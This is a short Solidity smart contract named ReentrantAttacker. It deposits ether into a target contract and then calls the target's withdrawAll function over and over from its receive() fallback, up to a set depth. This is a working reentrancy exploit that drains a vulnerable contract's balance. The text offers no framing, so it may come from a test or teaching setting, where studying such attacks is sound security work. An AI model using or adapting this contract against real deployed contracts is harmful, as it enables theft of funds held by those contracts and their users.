contract ReentrantAttacker {
    C public target;
    uint public depth;
    uint public maxDepth;
    constructor(C _target, uint _maxDepth) {
        target = _target;
        maxDepth = _maxDepth;
    }
    function depositAndAttack() external payable {
        target.deposit{value: msg.value}();
        target.withdrawAll();
    }
    receive() external payable {
        if (depth < maxDepth) {
            depth++;
            target.withdrawAll();
        }
    }
}

